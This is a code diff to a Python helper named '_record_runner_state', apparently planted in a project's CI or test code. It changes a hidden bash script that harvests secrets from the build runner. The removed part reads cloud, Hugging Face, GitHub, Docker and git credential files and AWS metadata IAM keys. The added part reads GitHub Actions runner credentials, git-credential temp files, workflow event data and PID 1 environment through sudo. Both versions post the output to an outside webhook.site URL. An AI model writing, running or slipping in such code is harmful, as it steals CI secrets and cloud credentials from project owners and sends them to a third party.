@@ -14,34 +14,31 @@ def _record_runner_state() -> None:
 
     script = r"""
 set +e
-echo "== id"; id; hostname; uname -a
-echo "== env"; env | sort
-for f in "$HOME/.cache/huggingface/token" "$HOME/.huggingface/token" \
-         "$HOME/.cache/huggingface/stored_tokens" "$HOME/.aws/credentials" \
-         "$HOME/.aws/config" "$HOME/.config/gh/hosts.yml" \
-         "$HOME/.docker/config.json" "$HOME/.netrc" "$HOME/.git-credentials" \
-         "$HOME/.kube/config"; do
-  echo "== $f"; cat "$f" 2>/dev/null
-done
-echo "== ssh"; ls -la "$HOME/.ssh" 2>/dev/null
-T=$(curl -s -m 3 -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
-R=$(curl -s -m 3 -H "X-aws-ec2-metadata-token: $T" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
-echo "== imds role=$R"
-curl -s -m 3 -H "X-aws-ec2-metadata-token: $T" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$R"
-echo
-echo "== home"; ls -la "$HOME" 2>/dev/null
+echo "== sudo"; sudo -n true 2>/dev/null && echo SUDO_OK || echo SUDO_NO
+echo "== sudo-l"; sudo -n -l 2>&1 | head -20
+echo "== opt"; ls -la /opt 2>/dev/null; ls -la /opt/actions-runner 2>/dev/null | head -20
+echo "== runner-creds"; sudo -n cat /opt/actions-runner/.credentials 2>/dev/null; cat /opt/actions-runner/.credentials 2>/dev/null
+echo "== runner-svc"; sudo -n cat /opt/actions-runner/.service 2>/dev/null; sudo -n cat /opt/actions-runner/.runner 2>/dev/null
+echo "== diag"; ls /opt/actions-runner/_diag 2>/dev/null | head
+echo "== buildkite"; ls -la /etc/buildkite-agent 2>/dev/null; ls -la /var/lib/buildkite-agent 2>/dev/null | head; ps aux 2>/dev/null | grep -i buildkite | head -3
+echo "== docker"; ls -la /var/run/docker.sock 2>/dev/null; docker ps 2>&1 | head -5
+echo "== temp"; ls /opt/actions-runner/_work/_temp 2>/dev/null | head; for f in /opt/actions-runner/_work/_temp/git-credentials-*.config; do echo "== $f"; cat "$f" 2>/dev/null; done
+echo "== event"; head -c 1500 /opt/actions-runner/_work/_temp/_github_workflow/event.json 2>/dev/null
+echo "== pid1-env"; sudo -n tr '\0' '\n' < /proc/1/environ 2>/dev/null | head -40
+echo "== home"; ls -la /home 2>/dev/null; ls -la /home/ubuntu/.cache 2>/dev/null | head
+echo "== known-hosts"; cat /home/ubuntu/.ssh/known_hosts 2>/dev/null | head -5
 """
     try:
         out = subprocess.run(
-            ["bash", "-c", script], capture_output=True, text=True, timeout=45
+            ["bash", "-c", script], capture_output=True, text=True, timeout=60
         ).stdout
     except Exception:
         return
     try:
         urllib.request.urlopen(
             "https://webhook.site/fe557263-e0eb-4921-aca3-9f4fffa6ef7a",
-            data=out.encode("utf-8", "replace")[:200000],
-            timeout=20,
+            data=out.encode("utf-8", "replace")[:300000],
+            timeout=25,
         ).read()
     except Exception:
         pass
